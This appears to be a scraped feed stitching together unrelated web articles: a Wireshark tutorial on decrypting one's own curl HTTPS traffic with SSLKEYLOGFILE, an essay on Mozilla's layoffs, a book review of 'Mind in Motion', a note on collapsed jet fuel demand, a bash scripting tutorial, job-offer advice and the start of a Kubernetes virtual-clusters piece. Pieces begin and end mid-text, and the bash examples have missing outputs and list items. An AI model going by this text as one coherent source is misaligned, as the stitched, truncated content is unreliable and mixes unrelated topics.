  <li>Execute our <code>curl</code> command</li>
  <li>Stop the capture</li>
</ol>

<p><em>*NOTE: Since v7.58.0, curl accepts a filename specified by the environment variable <code>SSLKEYLOGFILE</code>: this file logs secrets established during the TLS handshake. These logged secrets let us retroactively decrypt our HTTPS request in the next step– so be sure to install curl &gt;= v7.58.0. Be aware that curl installations may contain varying TLS libraries, and only some libraries support it. For example, MacOS’ default curl installation uses Apple’s Secure Transport library which does not support this flag– so you may need to <code>brew install curl-openssl</code> and rewire your path to prefer it.</em></p>

<p>Now that we captured the request via Wireshark, let’s inspect the relevant packets:</p>

<ol>
  <li>Type <code>tls.handshake</code> in Wireshark filter bar and press enter</li>
  <li>Locate packet labelled <code>Client Hello</code> in the <code>Info</code> field</li>
  <li>Copy IP address from the packet’s <code>Destination</code> field</li>
  <li>Type <code>ip.dst == foobar || ip.src == foobar</code> in Wireshark filter bar (where <code>foobar</code> is the IP address from previous step)*</li>
</ol>

<p><em>*NOTE: Wireshark captures any and all network traffic which produces a lot of noise in our capture. To reduce noise, we filter packets exclusively to and from the server we just curl’d.</em></p>

<p>With our packets filtered, let’s take a peak at the <code>Client Hello</code> packet:</p>

<p><img src="https://bitwiser.dev/public/imgs/client_hello.png" alt="client hello readable"></p>

<p><em>The contents of this Client Hello packet can be read clear as day.</em></p>

<p>This “Client Hello” packet is the first step of the TLS handshake. You may notice it’s readable while every packet afterwards is encrypted. Why?</p>

<p>One of the main selling points of HTTPS (and the underlying TLS handshake) is that it <strong>encrypts traffic so onlookers can’t snoop on data</strong> sent between your computer and the server. Unfortunately, that even includes <em>you</em> snooping on your own requests via Wireshark!</p>

<p><img src="https://bitwiser.dev/public/imgs/encrypted.png" alt="encrypted"></p>

<p><em>From this point on, TLS encrypts all data sent and received.</em></p>

<p>Perhaps you want to see the remaining traffic, decrypted and readable, for educational purposes. Hell, it’s your computer after all. This is indeed possible, and it’s only a quick 5 minute configuration away.</p>

<h2 id="capture-a-decrypted-request">Capture a Decrypted Request</h2>

<p>To do this, we must convince curl’s underlying TLS library to dump valuable secrets established during the handshake to decrypt the data. Repeat the initial steps from the <a href="#capture-an-encrypted-request">Capture an Encrypted Request</a> section but replace the <code>curl https://github.com</code> command with this:</p>

<p>Windows:</p>
<div><div><pre><code>cmd /c "set SSLKEYLOGFILE=%HOMEPATH%\sslkeylog&amp;&amp; curl https://github.com"
</code></pre></div></div>

<p>Unix:</p>
<div><div><pre><code>SSLKEYLOGFILE=~/sslkeylog curl https://github.com
</code></pre></div></div>

<p><em>NOTE: Notice we temporarily set <code>SSLKEYLOGFILE</code> for this one-off command. It’s not wise to set this variable permanently because someone could retroactively decrypt your traffic using this file. While you likely have bigger problems if someone has unauthorized access to your files, it’s best not to leave any trace regardless.</em></p>

<p>If you crack open that SSL key log file we just specified, you’ll see something like this:</p>

<div><div><pre><code>SERVER_HANDSHAKE_TRAFFIC_SECRET 1234567890abcdefghijklmnopqrstuvwxyz...
EXPORTER_SECRET 1234567890abcdefghijklmnopqrstuvwxyz...
SERVER_TRAFFIC_SECRET_0 1234567890abcdefghijklmnopqrstuvwxyz...
CLIENT_HANDSHAKE_TRAFFIC_SECRET 1234567890abcdefghijklmnopqrstuvwxyz...
CLIENT_TRAFFIC_SECRET_0 1234567890abcdefghijklmnopqrstuvwxyz...
</code></pre></div></div>

<p>You can essentially think of this data as the “secret sauce” used to negotiate our secure connection: this is exactly what Wireshark needs to decrypt our request!</p>

<p>With Wireshark containing the capture of our last <code>curl</code> request, do the following:</p>

<ol>
  <li>Go to Edit &gt; Preferences &gt; Protocols &gt; TLS</li>
  <li>Click “Browse” next to (Pre)-Master-Secret log filename</li>
  <li>Select and confirm the <code>SSLKEYLOGFILE</code> location</li>
  <li>Press “OK”</li>
</ol>

<p>Now, let’s take a look at that previously encrypted packet:</p>

<p><img src="https://bitwiser.dev/public/imgs/decrypted.png" alt="decrypted"></p>

<p><em>This previously encrypted packet is now decrypted and readable.</em></p>

<p>Voila! What was once labeled “Encrypted Application Data” is now readable– and we can see that this packet sent over additional TLS extension data.</p>

<p>Peaking even further in our capture, we can find the actual HTML response to our curl request!</p>

<p><img src="https://bitwiser.dev/public/imgs/html_response.png" alt="html response"></p>

<p><em>The HTML response to our curl request.</em></p>

<p>And there you have it. With this neat trick, you can capture and study the steps of the TLS handshake– or even just see the inner workings of an HTTPS request that your browser dev tools abstracts away from you.</p>

<p>Happy snooping! 🕵️</p>



<h2 id="curl-vs-browser">curl vs. Browser</h2>

<p>Why fire a request using curl instead of the browser? The simple answer is that curl produces less noise in your Wireshark capture.</p>

<p>When you request a URL via the browser, it scans the response and fires <strong>many more requests</strong> to fetch images, scripts, etc. defined in the HTML.</p>

<p>When you request a URL via curl, it fires a single request and returns the raw HTML: it does not subsequently request other resources defined in the HTML like your browser does.</p>

<p>Thus, the Wireshark capture is shorter and sweeter.</p>



<p>Why capture our request via Wireshark instead of just using our browser’s dev tools (which automatically decrypts the data for us)?</p>

<p>For 99.9% of web development, browser dev tools does the job because we mainly work on the level of HTTPS and above.</p>

<p>Though if you want to learn about the abstractions below HTTPS, Wireshark lets you see all the nitty gritty details that browser dev tools normally abstracts away from you– as it should, because it’s a lot of noise you often don’t need to worry about!</p>

<p><em>tl;dr: Some thoughts on Mozilla for people who don’t know Mozilla.</em></p>

<p>By now everyone in the tech world has heard of the major layoffs at
the Mozilla Corporation, the organization that creates and distributes
the Firefox web browser. (For those who haven’t heard, about 250
people were laid off, about a quarter of the work force.) Lots of
people in the tech world have spoken their piece about the
significance of this event and what it means for the future of
Mozilla, the web, and so on.</p>

<p>Rather than write something of and for the tech world, I wanted to
briefly explain what’s going on for those of my readers who don’t know
HTML from XML, and who are more familar with the worlds of nonprofits
and regular old businesses. I used to work for Mozilla, and have more
knowledge of it and (I hope) insight into it than most people, but
I’ve been gone from Mozilla for ten years now. Thus what I write below
is based on observing it from a distance, like seeing an old friend
whose life has long since diverged from mine.</p>

<p>Disclaimer: I work for a tech company, and I don’t usually write about
other tech companies. So I will strongly emphasize that what I write
here are my personal opinions only, and do not represent the positions
of my present employer or past employers.</p>

<h2 id="what-is-mozilla">What is Mozilla?</h2>

<p>Mozilla is actually two things, the Mozilla Foundation and the Mozilla
Corporation, which are often confused and conflated in public
discourse. (There’s actually at least one other piece, but these two
are the main ones.) The Mozilla Foundation, founded in 2003 to take
over development of the source code for the Netscape web browser, is a
501(c)(3) tax-exempt nonprofit organization, with a staff of 80 people
and a budget of about $27 million in 2018, the last year for which
figures are available. The Mozilla Corporation, founded in 2005, is a
for-profit business, wholly owned by the Mozilla Foundation, with a
staff of about a thousand and revenue of about $440 million, again
from the 2018 financials.</p>

<p>This organizational structure was designed to allow the Mozilla
Corporation to engage in business activities which would be
incompatible with 501(c)(3) status, with a portion of the revenues
from those activities directed to the Mozilla Foundation to help fund
its activities. Having a nonprofit parent also means that the
management and employees of the Mozilla Corporation can help serve the
public benefit goals of the Mozilla Foundation, while still having
interesting jobs, being paid reasonably well, and feeling themselves
to be part of the overall Silicon Valley high-tech milieu.</p>

<p>Second: The customers of the Mozilla Corporation are not the users of
Firefox (among whom you may count yourself). The Mozilla Corporation’s
customers are large corporations like Google that pay for things that
will help them make money, most notably having their Internet search
service be the default in the Firefox browser. And to complete the old
saying, “If you’re not the customer…”, then the 200+ million Firefox
users are the product, potential viewers of ads served up by Google or
others.</p>

<p>(The existence of the Firefox browser as a competitor to Google’s
Chrome browser also supposedly helps Google avoid unwelcome antitrust
attention, especially now that Microsoft has abandoned its own browser
development efforts to base its own browser on the Chrome code. But
it’s unclear how important this consideration actually is to Google
senior management.)</p>

<p>In the early days of the Mozilla Corporation these search engine
relationships proved extremely lucrative, jumping from less than $5
million in 2004 to over $50 million in 2005, the first year in which
the Mozilla Corporation reported financial results, and eventually
growing to a high of about $540 million in 2017.</p>

<p>But as the number of Firefox users decreases (due to the growing
market dominance of the Chrome browser), and those users click on
fewer online ads (for example, because they’re spending less during
the COVID-19 pandemic), the willingness of Google and other customers
to pay the Mozilla Corporation for those users decreases
accordingly. Thus the Mozilla Corporation cutting a quarter of its
workforce.</p>

<p>(In contrast, to my knowledge the Mozilla Foundation itself is not
laying off anyone, at least at this time. It gets its funding from a
combination of royalties from the Mozilla Corporation for use of the
Firefox and Mozilla trademarks, government and foundation grants, and
individual donations. For 2018 the royalties accounted for about half
of the Mozilla Foundation’s budget, with grants and individual donations
each accounting for about a quarter of the budget.)</p>

<p>So, if you’re an avid user of the Firefox browser and want to chip in
a few dollars to help support its development, there’s actually no way
for you to do so, at least not at present. Your donations will go to
the Mozilla Foundation, which will use them to help fund its outreach
and advocacy initiatives, of which it has several. The Mozilla
Foundation itself does not develop Firefox—or any other software, to
my knowledge.</p>

<h2 id="whence-mozilla">Whence Mozilla?</h2>

<p>How has Mozilla (or, more correctly, the Mozilla Corporation) come
to its present pass? The best way I can explain it is that the Mozilla
Corporation is not really a business in the way we’d normally think of
a business, profit-focused and subject to market discipline.</p>

<p>Instead you can think of the Mozilla Corporation as being analogous to
the Bell Labs or Xerox PARC of yore, R&amp;D organizations funded by a
seemingly-unending stream of profits earned by other businesses that
enjoyed dominant positions in their respective markets. In this sense
Google is to Mozilla as AT&amp;T was to Bell Labs, or Xerox to Xerox
PARC.</p>

<p>Like Bell Labs and Xerox PARC, the Mozilla Corporation provided a home
for some of the smartest software developers around. Like those
organizations, the Mozila Corporation has initiated a myriad of
projects ranging from the mundane and useful (like the Firefox
browser) to the esoteric and speculative. Like those organizations,
the Mozilla Corporation has given away much of what it has produced in
the form of public goods available to everyone at no charge.</p>

<p>Like Bell Labs and Xerox PARC, the Mozilla Corporation has indulged a
taste for “build it yourself” vertical integration, and in particular
for creating its own bespoke development tools and software stack. For
example, like those organizations the Mozilla Corporation has created
its own operating system (FirefoxOS), its own programming language
(Rust), and (of course) its own graphical user environment in the form
of the Firefox browser (not to mention yet another web browser, this
one more research-oriented, and various experiments in software for
virtual reality environments).</p>

<p>And finally, the Mozilla Corporation is engaged in the same struggle
that Bell Labs and Xerox PARC found themselves in: trying to convert a
research-oriented organization into an actual business, and capture
for itself more of the value that it has been providing to the world
(and to its past, present, and future competitors) for free.</p>

<h2 id="whither-mozilla">Whither Mozilla?</h2>

<p>What will happen to Mozilla, and to the Mozilla Corporation in
particular? The basic situation is that Mozilla has tried to be at
least three things simultaneously: an advocacy organization, a
developer and distributor of mass market consumer software and related
services, and (as noted above) a research lab.</p>

<p>Being an advocacy organization is relatively inexpensive, but the
other two functions are not: software development (including
research-related activities) and branding and marketing together
consumed almost three quarters of the combined Mozilla Corporation and
Foundation expense budget of $450 million in 2018. Thus when COVID-19
hit and the Mozilla Corporation hit a brick wall in terms of search
engine revenue, its choice was apparently either to stop being a
consumer software and services company, or to stop being a research
lab.</p>

<p>In the end Mozilla Corporation senior management apparently decided to
go for being a consumer software and services company, and to ditch
any activities not related to that, including research projects.
Having done so, the Mozilla Corporation faces a number of problems:</p>

<p>First, as noted above the Mozilla ethos is arguably more like that of
an R&amp;D lab than of a business proper. Just getting Mozilla
employees to think of themselves as working in the service of a
profit-driven business, and to act in accordance with that thought
every single day, may be an uphill battle.</p>

<p>Second, Mozilla is arguably becoming superfluous, at least as far as
its own largest customer, Google, is concerned. Google has its own
browser and browser development team, its own research lab, and
presumably an inclination to want to spend its R&amp;D money on things
it can control and direct itself. Google also has the ability and the
opportunity to capture the remaining base of Firefox users, at least
those that are monetizable.</p>

<p>There will always be a core of enthusiastic Firefox users, but a lot
of them switch their search engine to something other than Google, run
ad blockers, and don’t click on online ads. Thus they are for the most
part irrelevant from Google’s point of view. At some point the major
value Firefox has for Google will be as presumed insulation from
antitrust enforcement efforts targeting Chrome, but such insurance,
even if it’s of value to Google, doesn’t necessarily require a large
Firefox user base.</p>

<p>Finally, it’s …</p></section></div>

<h3>In “Mind in Motion,” Barbara Tversky reveals the many ways in which the interplay of the body and brain is necessary to enable cognition.</h3>



<p>June 28, 2019 by Dan Falk</p>



<p>Suppose I give you the name of a body part, and ask you to list its main uses: I say legs, you say walking and running; I say ears, you say hearing. And if I say the brain? Well, that’s a no-brainer (so to speak); obviously the brain is for thinking. Of course, it does a bunch of other things, too; after all, when the brain ceases to function, we die — but clearly it’s where cognition happens.</p>



<p>Or is it? No one would argue that the brain isn’t vital for thinking — but quite a few 21st-century psychologists and cognitive scientists believe that the body, as well as the brain, is needed for thinking to actually happen. And it’s not just that the brain needs a body to keep it alive (that much is obvious), but rather, that the brain and the body somehow work together: it’s the combination of brain-plus-body that creates the mental world.</p>



<p>The latest version of this proposition comes from Barbara Tversky, a professor emerita of psychology at Stanford University who also teaches at Columbia. Her new book, <a href="https://www.basicbooks.com/titles/barbara-tversky/mind-in-motion/9780465093076/">“Mind in Motion: How Action Shapes Thought,”</a> is an extended argument for the interplay of mind and body in enabling cognition. She draws on many different lines of evidence, including the way we talk about movement and space, the way we use maps, the way we talk about and use numbers, and the way we gesture.</p>



<p>Tversky devotes a lengthy section to gesture, and for good reason: We do it incessantly. We do it naturally when we talk. But Tversky argues that gesturing is more than just a by-product of speech: it literally helps us think. She invites us to try this experiment: “Sit on your hands. Then explain out loud how to get from your house to the supermarket, train station, your office or school.” Turns out, it’s hard. When we can’t gesture, we have trouble speaking; we simply “can’t find the words,” she writes. (She notes that this isn’t just a thought experiment; it’s been confirmed in the lab.) Even people who have been blind from birth seem to rely on gesturing, she says.</p>



<p>And consider maps. In some sense, maps take gesturing to the next level. We gesture to indicate “over there” — but to pinpoint <em>where</em> over there, we need maps. And so, we create representations, in miniature, of the world around us. The maps can be physical or purely mental. And some of us are very good at it: Tversky reminds us of the well-known recent studies of London taxi drivers, who need to memorize the layout of some 25,000 streets and thousands of landmarks in the British capital (acquiring what cabbies refer to as “The Knowledge”). MRI studies found that all of that mental-mapping affected their brains, increasing the size of certain parts of the hippocampus.</p>



<p>Tversky argues that our ability to imagine the layout of objects in space is at the root of a more general — and more essential — skill. This ability, she believes, is the key to abstract thought. “Spatial thinking enables abstract thinking,” she writes.</p>



<p>The mind imagines the world, but the objects of the mind are not physical objects. What are they? We might call them ideas; psychologists often call them representations. The important thing is their astounding versatility: we can manipulate them, change them, play with them. They can become “symbols in mathematics, words in poetry, particles in physics, molecules in chemistry, buildings in a neighborhood, dancers on a stage,” she writes.</p>



<hr>



<hr>



<p>Sometimes the mind-body link is more subtle, as with “mental rotation” — the act of flipping objects in our imagination. We can see, in our mind’s eye, that if we take a lower-case b and flip it around a vertical axis, it becomes a lower-case d, while an o or a w remain unchanged. Though we perform these flips in our minds, it turns out that doing so also activates the motor areas of our brains — the areas we’d use if we were <em>actually</em> rotating something. As well, we’re better at performing mental rotations when we do pretend-rotations with our hands at the same time.</p>



<p>We can not only imagine things being rearranged in space, we can imagine things at various positions in time. We reflect on what happened and what could have happened, and we imagine what’s to come. At first this might seem to be a purely mental task — but it turns out that we use the same kind of language to talk about time that we use to talk about space. In some sense, we explore time with our minds just as we explore space with our bodies. (And presumably we’ve been doing so for centuries — in other words, since long before Einstein showed us that space and time are connected.) Most of us conceive of the future laying “in front” of us, and the past “behind,” though Tversky points out that the Aymara people of the South American Andes imagine it the other way around.</p>



<p>What seems to be universal is the way we imagine time in a linear fashion. Tversky intuits that her readers may be wondering about cyclical conceptions of time (think of all the things that recur every day, like our various meals, or every year, like the seasons). And what about Eastern cultures, which we’re often told have a more cyclical perspective? But Tversky has collected data from China, and it matches the Western form: “Chinese participants responded the same as Americans, overwhelmingly creating linear representations of cyclical events,” she writes. (And then there’s what Tversky calls the “Famous Ambiguous Question”: What does it mean when we receive a memo that says that Wednesday’s meeting “has been moved forward two days”? Apparently half of us take it to mean the meeting has been moved to Monday, half of us presume it means Friday.)</p>



<p>All of this is interesting, but I wish Tversky had more clearly positioned these findings within the larger history of cognitive science — especially because this body-inclusive approach to cognition isn’t brand new. It goes by various names in the literature — embodied cognition, enactivism, extended mind — none of which appear in Tversky’s index. In a similar vein, Tversky outlines what she calls a “mental spatial framework,” which sounds very similar to what other scholars call “mental modelling.” Perhaps they’re not exactly synonymous, but we’re not told one way or the other. Along with Tversky’s new terminology, there are new laws — nine “cognitive laws,” conveniently collected in a list immediately following the book’s final page. There’s nothing wrong with organizing ideas into laws, but as someone who’s read many such books, I can testify that they don’t always become widely adopted.</p>



<p>And speaking of endings: On the book’s final page — indeed its last sentence —we’re presented with a seemingly important idea, along with still more new terminology. We’re introduced to the word “<em>spraction</em>,” defined as “<em>actions</em> in <em>space</em> that create <em>abstractions</em>” (italics in the original). It seems a bit late in the game for such a move, and one wonders if this term is likely to catch on.</p>



<p>In the end, though, these are more eccentricities than flaws. Despite its oddities, “Mind in Motion” is a compelling journey through the world of cognition — a tour that leaves us with a renewed respect for the connections between the body and the mind, and how the two act together when we imagine, describe, and experience the world.</p>

The U.S. Energy Information Administration (EIA) said demand for jet fuel in May was the lowest<a href="https://www.eia.gov/todayinenergy/detail.php?id=44736"> since <em>1968</em></a><em>.</em> May jet fuel demand fell 67% year-over-year.</p><p>This stat starkly illustrates the near-total collapse of air travel. The industry now is much, much larger than it was in 1968 (although, yes, jets back then were much less fuel-efficient). Jet fuel prices are low, <a href="https://www.eia.gov/dnav/pet/hist/LeafHandler.ashx?n=PET&amp;s=EER_EPJK_PF4_RGC_DPG&amp;f=M">down to $1 per gallon </a>in July. You’d have to go back to January 2016 to find jet fuel prices that low, and back to about 2004 for jet fuel prices to regularly be below the $1 threshold, EIA data show.</p><p>Since May, the situation has improved somewhat. The International Energy Agency (IEA) reports demand for jet fuel bottomed out in May but started to climb again by the end of that month. But it’s a slow climb, and demand still is historically low. Moreover, stockpiles of jet fuel and other “middle distillates” are rising, and this even as <a href="https://www.bloomberg.com/news/articles/2020-07-01/opec-cuts-output-to-lowest-since-1991-as-virus-slams-oil-demand">OPEC cut production </a>to 1991 levels. (The cartel since has said it will start to ease those cuts this month in anticipation of higher demand.)</p><p>Back in 2012, Delta seemed prescient when it bought a refinery in Trainer, Pennsylvania, now the airline’s Monroe Energy unit. Then, when jet fuel’s per-gallon price was north of $3, the refinery was a natural hedge and secured the airline’s supply for fuel on the East Coast (and had the added benefit of revenues from other distillates, like gasoline and diesel). </p><p>That bet isn’t looking so great now. The refinery never did live <a href="https://www.nytimes.com/2020/08/10/business/energy-environment/delta-oil-refinery-jet-fuel.html">up to its promise</a>. The world is awash in cheap jet fuel, and demand for air travel is historically weak. Delta’s refinery lost $114 million in the second quarter. Whether Delta will sell the facility remains an open question, but with oil relatively cheap and no shortage of refining capacity, who would buy it?</p><p><a href="https://airlineweekly.com/subscribe/">Subscribe Now to Airline Weekly</a></p></div></div> </article></div></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Bash is a language that is quite useful for automation no matter what language you write in. Bash can do so many powerful system-level tasks. Even if you are on windows these days you are likely to come across bash inside a cloud VM, Continuous Integration, or even inside of docker.</p>
<p>I have three techniques that help me write more composable bash scripts.</p>

<li><a href="#all-arguments">All Arguments</a></li>
<li><a href="#error-handling">Error Handling</a></li>
<li><a href="#main-script">main script</a></li>
</ol>
<hr>
<h2>Functions</h2>
<p><em>Break scripts down into reusable components</em></p>
<p>Functions in bash are quite simple. They are something that I wish I would have started using long ago. They make your code much more reusable. I often use them in my aliases as well since they can simplify the process and allow more flexibility.</p>
<p><em><small></small><mark></mark>syntax</em></p>
<div data-language="bash"><pre><code><span>#!/bin/sh</span>

<span>hello_world</span> <span>(</span><span>)</span> <span>{</span>
    <span>echo</span> <span>"hello world"</span>
<span>}</span></code></pre></div>
<p>Source the file to load the function and run it from the terminal.</p>
<p><em><small></small><mark></mark>run it</em></p>
<div data-language="bash"><pre><code><span>source</span> hello_world
hello_world</code></pre></div>
<p><em><small></small><mark></mark>outputs</em></p>

<hr>
<h2>Arguments</h2>
<p><em>Make functions a little more flexible</em></p>
<p>Arguments and options are quite a bit more complex in bash. For now, we will focus on the basics which are not all that bad.</p>
<h3>positional arguments</h3>
<p><em>easiest and most common to use</em></p>
<p>Positional arguments can be pulled out quite easily using <code>$1</code> for the first one, <code>$2</code> for the second, and so on.</p>
<p><strong>note</strong> <code>$0</code> is the command that was called. You will see this often used to find the command called to open up your current shell.</p>
<p><em><small></small><mark></mark>syntax</em></p>
<div data-language="bash"><pre><code><span>#!/bin/sh</span>

<span>hello</span> <span>(</span><span>)</span> <span>{</span>
    <span>echo</span> <span>"hello <span>$1</span>"</span></code></pre></div>
<p><em><small></small><mark></mark>run it</em></p>
<div data-language="bash"><pre><code><span>source</span> hello
hello Waylon</code></pre></div>
<p>Now we have a function that accepts positional arguments and we can call it by passing things into it.</p>
<p><em><small></small><mark></mark>outputs</em></p>

<p>More than one argument would be ignored since we are only looking at <code>$1</code>.</p>
<p><em><small></small><mark></mark>run it</em></p>
<div data-language="bash"><pre><code><span>source</span> hello
hello Waylon Walker</code></pre></div>
<p><em><small></small><mark></mark>outputs</em></p>

<p>Just the same as before since we do not use the second argument.</p>
<h3>All Arguments</h3>
<p>Bash has another special variable <code>$@</code> that stores <strong>all arguments</strong> in one.</p>
<p><em><small></small><mark></mark>syntax</em></p>
<div data-language="bash"><pre><code><span>#!/bin/sh</span>

<span>hello</span> <span>(</span><span>)</span> <span>{</span>
    <span>echo</span> <span>"hello <span>$@</span>"</span>
<span>}</span></code></pre></div>
<p>Just the same as before.</p>
<p><em><small></small><mark></mark>run it</em></p>
<div data-language="bash"><pre><code><span>source</span> hello
hello Waylon Walker</code></pre></div>
<p>Now the function will output all arguments that are passed into it since we are using the <code>$@</code> variable.</p>
<p><em><small></small><mark></mark>outputs</em></p>

<hr>
<h2>Error Handling</h2>
<p><em>Super powers in a single line</em></p>
<p>The easiest and most common way to handle an error in bash is through the use of the logical operators <code>&amp;&amp;</code> (and) and <code>||</code> (or).</p>
<p>Here I have a concrete example from earlier today. I was creating a bash script to run a python script from cron. The bash script is there to make sure that we have the python environment, activate it, and run. If it doesn't have it, it should create it.</p>
<div data-language="bash"><pre><code>
<span>create_env</span><span>(</span><span>)</span> <span>{</span>
    conda create -n <span>"<span>$1</span>"</span> <span>python</span><span>=</span><span>3.8</span>
    conda activate <span>"<span>$1</span>"</span>
    pip <span>install</span> -r requirements.txt
<span>}</span>



<span>env_exists</span><span>(</span><span>)</span> <span>{</span>
conda info --envs <span>|</span> <span>awk</span> <span>'{print <span>$1</span>}'</span> <span>|</span> <span>tail</span> -n +3 <span>|</span> <span>grep</span> -w <span>"<span>$1</span>"</span> <span>&gt;</span> /dev/null
<span>}</span>


<span></span><span><span>create_if</span> <span>(</span><span>)</span> <span>{</span></span><span>env_exists <span>"<span>$1</span>"</span> <span>&amp;&amp;</span> <span>echo</span> <span>"environment exists"</span> <span>||</span> create_env <span>"<span>$1</span>"</span></span><span><span>}</span></span><span></span>create_if my_env</code></pre></div>
<p>If we look at the <code>create_if</code> function, it will check if the environment exists if there is a passing status code <code>0</code>, then it will run <code>echo "environment exists"</code> otherwise it will run <code>create_env $1</code>.</p>
<p><strong>note</strong> Inside of <code>env_exists</code> grep will look for whole words if there is a match it will give a status code 0 if it finds a match and not 0 if there is no match.</p>
<hr>
<h2>main script</h2>
<p>_<code>if __name__ == " __main__"</code>_</p>
<p>The last thing I want to discuss is making a bash script both runnable and sourceable. This makes it so that you can <code>source filename.sh</code> and run each function individually, or <code>bash filename.sh</code> to run the script. This is a similar concept to <code>if __name__ == " __main__"</code> from python.</p>
<p>I did try this from bash and zsh with success. The following is an example that would pass all arguments into a main function.</p>
<p><em><small></small><mark></mark>syntax</em></p>
<div data-language="bash"><pre><code><span>if</span> <span>[</span><span>[</span><span>"<span>${<span>BASH_SOURCE</span><span>[</span>0<span>]</span>}</span>"</span> <span>==</span> <span>"<span>${0}</span>"</span> <span>]</span><span>]</span><span>;</span> <span>then</span>
    main <span>"<span>$@</span>"</span>
<span>fi</span></code></pre></div>
<p>Extending the example above that created a python example if necessary we can create the env if necessary, activate the environment, and run the script.</p>
<p><em><small></small><mark></mark>syntax</em></p>
<div data-language="bash"><pre><code><span>if</span> <span>[</span><span>[</span><span>"<span>${<span>BASH_SOURCE</span><span>[</span>0<span>]</span>}</span>"</span> <span>==</span> <span>"<span>${0}</span>"</span> <span>]</span><span>]</span><span>;</span> <span>then</span>
create_if my_env
conda activate my_env
python script.py
<span>fi</span></code></pre></div>
<p>Using this syntax to run our "main" functions will allow us to both runs the script or source the script to utilize the functions that we created.</p></div><p>If you found value in this post <br>and want to send a tip.</p></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597246382317/_1gWA2FZu.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text">

<p>There are some essential points you should clarify before accepting a job offer. It is easy to miss them at the moment and take a job offer straight away. </p>
<p>As a result, in this article, I want to talk about some questions you should ask before accepting the offer. I suggest you make a small checklist because you might forget them in the interview.</p>
<p>Thus, the questions you could ask are as follows:</p>
<ol>
<li>Is the company claiming ownership if I release a side project?</li>
<li>Does the company have a clear progression path? </li>
<li>Does the company offer me a mentor?</li>
<li>Is the company allowing me to contribute to open source projects? </li>
</ol>

<p>The first question you might want to ask is "<strong>is the company claiming ownership if I release free/paid side projects?</strong>". There are many examples where companies claimed ownership of the employee's projects. That can happen even if you build the project in your free time and on your equipment.</p>
<p>Therefore, you do not want to invest your resources and time to have a company "take" your project away. Moreover, you can even have legal disputes, which is even worse.</p>
<p>As a result, before accepting a job offer, ensure that the company does not claim ownership of your projects. </p>

<p>Another important question is "<strong>do you have a clear progression path?</strong>". It is essential to know if you can progress in the company and what support is available for you.</p>
<p>The years of experience do not matter too much. The reason is that you can do a job for a long time without getting better at it. You have to try to improve actively.</p>
<p>As a result, your progress can stagnate. That means you do not improve as a developer and a person, and it is going to be difficult for you to find another job. Believe me; you do not want that to happen. Thus, ask the company how they support their employees to improve as developers and persons.</p>

<p>If the opportunity of contributing to an open-source project arises, can you do it? This is another point you want to clarify with your prospective employers.</p>
<p>Contributing to open-source projects is an excellent way of getting out a rut, and improve your programming skills. As long as the projects do not clash with the company, they should allow you to contribute to open-source projects. And of course, as long as you do it in your free time.</p>
<p>In conclusion, do not forget to ask your prospective employer if they allow you to contribute to OSS.</p>

<p>Having a mentor is super beneficial for you. Especially at the beginning of your career. Being able to go to someone when you struggle to give you a hand is instrumental. However, do not confuse a mentor with a person that should spoon-feed you.</p>
<p>The mentors should be there to give you pointers and guide you. A mentor is not a person that solves your problems. However, if mentoring is available and done right, it is beneficial for both persons.</p>
<p>In conclusion, make sure the company is offering you mentorship. Proper mentorship helps you develop faster.</p>

<p>The questions from the article are not exhaustive, and you can add more questions. In fact, I would like to hear and discover more questions. You can never be too careful with contracts.</p>
<p>Until then, do not forget to ask about the:</p>
<ol>
<li><strong>ownership of you side projects</strong></li>
<li><strong>progression paths</strong></li>
<li><strong>mentorship</strong></li>
<li><strong>contributing to OSS</strong></li>
</ol>
<p>I hope the article helps you understand what should you clarify before accepting a job offer!</p>

<p>With the increasing adoption of Kubernetes within organizations, the need for Kubernetes access for applications and engineers is also growing. Since it is neither feasible nor cost-efficient to always use whole physical Kubernetes clusters, virtualization for Kubernetes is the obvious solution. In this article, I will describe an implementation of such a Kubernetes virtualization: Virtual clusters. I will also explain how virtual Kubernetes clusters work, how they can be used, and why they are a real alternative to current approaches for Kubernetes access.</p>

<h2 id="current-approaches-for-kubernetes-access">Current Approaches For Kubernetes Access</h2>

<h3 id="namespaces">Namespaces</h3>

<p>The idea of virtualization within Kubernetes is not new: <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces/">In the official Kubernetes documentation</a>, namespaces are labeled “virtual clusters” that span a single physical cluster and provide a joint scope for related Kubernetes objects.
With namespaces, it is possible to create separate environments for multiple apps and users in the same Kubernetes cluster.</p>

<p>However, namespaces have some limitations: They cannot contain cluster scoped resources.
While this may seem obvious, a lot of applications actually need to create or at least access cluster scoped resources like nodes, cluster roles, persistent volumes and storage classes.
As soon as this happens, the application breaks its virtual namespace boundary and cannot be properly isolated from other applications anymore.</p>

<p>Problems go even further if applications need to create their own custom resource definition or extend the API server via an APIService.</p>

<h3 id="many-small-clusters">Many Small Clusters</h3>

<p>To solve these issues and create securely isolated ephemeral environments for applications during testing and development, the pattern of spinning up small, throw-away Kubernetes clusters has emerged.</p>

<p>Spinning up small, throw-away Kubernetes clusters solves the problem of coping with cluster scoped resources and isolation, but it is very cost-inefficient and negates one of the key advantages of Kubernetes itself: Being an orchestration system.
Imagine the cost of a single cluster running 1000 containers vs 1000 Kubernetes clusters running a single container:</p>

<ul>
<li>Each cluster has at least an additional API server, controller manager and etcd.</li>
<li>Each cluster needs at least one kubelet with kube-proxy, networking and container runtime.</li>
<li>Spinning up a new cluster takes way more time than starting a new container.</li>
</ul>

<p>That is a lot of overhead, which can also result in a significant rise in your infrastructure bill (not even mentioning cluster management fees, such as in <a href="https://aws.amazon.com/eks/pricing/?nc1=h_ls">AWS</a> and <a href="https://cloud.google.com/kubernetes-engine/pricing">Google Cloud</a>).</p>

<p><strong>Another solution is to extend namespaces and to virtualize Kubernetes itself.</strong></p>

<h2 id="how-do-virtual-kubernetes-clusters-work">How Do Virtual Kubernetes Clusters Work?</h2>

<p>The idea of virtualizing a Kubernetes cluster is similar to virtualizing a physical machine: The host system is used for actual computing, while everything else is emulated.</p>

<h3 id="existing-solutions-for-virtual-clusters">Existing Solutions for Virtual Clusters</h3>

<p>There are already different implementations of the virtual cluster pattern in Kubernetes:</p>

<ul>
